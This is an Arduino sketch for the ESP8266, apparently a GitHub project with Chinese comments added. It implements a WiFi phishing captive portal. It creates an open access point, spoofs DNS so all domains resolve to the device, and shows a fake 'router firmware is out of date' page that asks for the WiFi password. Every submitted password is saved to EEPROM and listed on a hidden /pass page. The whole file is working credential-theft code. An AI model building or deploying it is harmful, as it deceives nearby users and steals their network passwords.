// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)

// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "测试"; // 默认SSID名称

// Default main strings
#define SUBTITLE "Router info." // 路由器信息
#define TITLE "Update" // 更新
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally." // 您的路由器固件已过期。请更新固件以继续正常浏览。
#define POST_TITLE "Updating..." // 正在更新...
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you." // 路由器正在更新。请等待过程完成。谢谢。
#define PASS_TITLE "Passwords" // 密码
#define CLEAR_TITLE "Cleared" // 已清除

// Init system settings
const byte HTTP_CODE = 200; // HTTP状态码
const byte DNS_PORT = 53; // DNS端口
const byte TICK_TIMER = 1000; // 定时器间隔
IPAddress APIP(172, 0, 0, 1); // Gateway // 网关

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
// 用于在EEPROM中存储密码
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time. // 检查ESP是否首次运行的位置
int passStart = 30;            // Starting location in EEPROM to save password. // 密码在EEPROM中的起始位置
int passEnd = passStart;       // Ending location in EEPROM to save password. // 密码在EEPROM中的结束位置


unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>"+
    "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
}

String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list. // 以有序列表形式添加密码
  allPass += pass;                       // Updating the full passwords. // 更新所有密码

  // Storing passwords to EEPROM.
  // 将密码存储到EEPROM
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM. // 将密码添加到EEPROM中现有密码后面
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM. // 更新EEPROM中密码的结束位置
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return "a";
}

String clear() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position. // 将密码结束位置设置为起始位置
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The built-in LED will blink 5 times after a password is posted. // 密码提交后内置LED闪烁5次
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED. // 控制LED闪烁
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup() {
  // 初始化串口，方便调试输出
  Serial.begin(115200);
  
  // 记录启动时间和最近活动时间
  bootTime = lastActivity = millis();

  // 初始化EEPROM，分配512字节空间
  EEPROM.begin(512);
  delay(10); // 稍作延时，确保EEPROM初始化完成

  // 检查是否为首次运行，通过读取EEPROM中特定位置的数据判断
  String checkValue = "first"; // 用于标记首次运行的字符串

  for (int i = 0; i < checkValue.length(); ++i)
  {
    // 如果EEPROM中存储的内容与"first"不一致，说明是首次运行
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // 写入"first"到指定位置，作为已初始化的标记
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      // 清空SSID和密码的存储区域
      EEPROM.write(0, '\0');         // SSID存储区首地址写入结束符，表示无SSID
      EEPROM.write(passStart, '\0'); // 密码存储区首地址写入结束符，表示无密码
      EEPROM.commit();               // 提交更改到EEPROM
      break; // 完成初始化后退出循环
    }
  }
  
  // 从EEPROM读取SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') { // 直到遇到字符串结束符
    ESSID += char(EEPROM.read(i)); // 逐字节拼接SSID
    i++;
  }

  // 读取EEPROM中已保存的所有密码，并确定密码结束位置
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // 追加到allPass字符串
    passEnd++;                             // 密码结束位置后移
  }
  
  // 设置WiFi为AP模式（热点模式）
  WiFi.mode(WIFI_AP);

  // 配置AP的IP地址、网关和子网掩码
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // 设置当前SSID为EEPROM中读取到的SSID，如果没有则用默认SSID
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  // 串口输出当前SSID，便于调试
  Serial.print("Current SSID: ");
  Serial.print(currentSSID);

  // 启动WiFi热点
  WiFi.softAP(currentSSID);  

  // 启动DNS服务器，实现DNS欺骗（所有域名都指向本机IP）
  dnsServer.start(DNS_PORT, "*", APIP);

  // 配置Web服务器的路由
  webServer.on("/post",[]() { 
    webServer.send(HTTP_CODE, "text/html", posted()); // 处理密码提交
    BLINK(); // 密码提交后LED闪烁
  });
  webServer.on("/ssid",[]() { 
    webServer.send(HTTP_CODE, "text/html", ssid()); // 处理SSID修改页面
  });
  webServer.on("/postSSID",[]() { 
    webServer.send(HTTP_CODE, "text/html", postedSSID()); // 处理SSID修改提交
  });
  webServer.on("/pass",[]() { 
    webServer.send(HTTP_CODE, "text/html", pass()); // 显示所有已保存的密码
  });
  webServer.on("/clear",[]() { 
    webServer.send(HTTP_CODE, "text/html", clear()); // 清空密码
  });
  webServer.onNotFound([]() { 
    lastActivity=millis(); 
    webServer.send(HTTP_CODE, "text/html", index()); // 处理未匹配到的路径，返回首页
  });
  webServer.begin(); // 启动Web服务器

  // 配置并点亮板载LED（高电平熄灭，低电平点亮，具体看硬件）
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH); // 默认关闭LED
}

void loop() { 
  // 每隔TICK_TIMER毫秒更新时间
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    // 这里可以添加定时任务
  }
  // 处理DNS请求，实现劫持
  dnsServer.processNextRequest();
  // 处理HTTP请求
  webServer.handleClient();
}